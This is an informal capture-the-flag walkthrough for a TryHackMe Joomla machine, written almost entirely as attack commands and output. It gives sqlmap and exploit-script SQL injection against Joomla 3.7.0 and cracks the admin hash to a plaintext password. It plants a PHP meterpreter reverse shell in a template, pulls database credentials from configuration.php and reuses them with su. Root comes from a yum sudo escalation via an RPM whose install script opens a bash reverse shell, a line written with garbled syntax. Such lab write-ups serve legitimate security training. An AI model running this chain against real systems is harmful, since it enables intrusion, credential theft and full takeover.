1)
- go to exploit db
- type joomla sqli
- in the exploit it tells us that the version is 3.7.0
2)
- searchsploit joomla 3.7.0
-  cat /usr/share/exploitdb/exploits/php/webapps/42033.txt
- sqlmap -u "http://IP/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs=MySql -p list[fullordering] --dump
- sqlmap -u "http://IP/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla -T '#__users' --dump
- That was the proper way of doing this challenge, however it is very inconsistant and takes hours, i found a github script which bypasses this step (in retrospect the challenge tells me sqlmap was a bad way anyway), https://github.com/XiphosResearch/exploits/tree/master/Joomblah
- python joomblah.py http://IP
- Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
- put the hash you get into hash.txt
- sudo john hash.txt --wordlist=rockyou.txt
- or hashcat -a 0 -m 3200 hash.txt rockyou.txt
- sadly either will take along time, 15-30 mins
- spiderman123
3)
- log into jonah on IP/administrator
- go to extensions > templates > Beez3 > index.php
- replace the php with a rever shell and listen on a port
- msfvenom -p php/meterpreter/reverse_tcp lhost=10.11.13.209 lport=1234 R
- nc -lvnp 1234
- you have a shell
- I couldnt do much with this shell so i tried a different method
- msfvenom -p php/meterpreter/reverse_tcp lhost=10.11.13.209 lport=1234 R
- replace the php code with the output of the prior command
- msfconsole > use exploit/multi/handler > set payload php/meterpreter/reverse_tcp > set lhost tun0 > set lport 1234 > run
- on the website click view preview and you now have a meterpreter shell but still have no access
- whoami reveals we are "apache" so i look for the apache folder with find / -name 'conf' 2>/dev/null
- /etc/httpd/conf is revealed
- reading conf hints at /var/www/html
- in this folder there is configuration.php which contains passwords and user for the mysql database

- public $user = 'root';
- public $password = 'nv5uz9r3ZEDzVjNu';

- mysql -h IP -u root -p nv5uz9r3ZEDzVjNu
- didnt seem to work so i tried this as the password to jjameson
- su jjameson
- it worked. cat jjameson/user.txt
4)
- sudo -l tells us we have access to /usr/bin/yum
- make sure you have fpm and rpm installed
- make a file containing ```#!/bin/bash \n bash -i .& /devl/tcp/tun0/1235 0>&1```
- fpm -n root -s dir -t rpm -a all --before-install root.sh ./root.sh
- upload root-1.0-1.noarch.rpm
- sudo /usr/bin/yum  install -y root-1.0-1.noarch.rpm
- nc -lvnp 1235
- cat /root/root.txt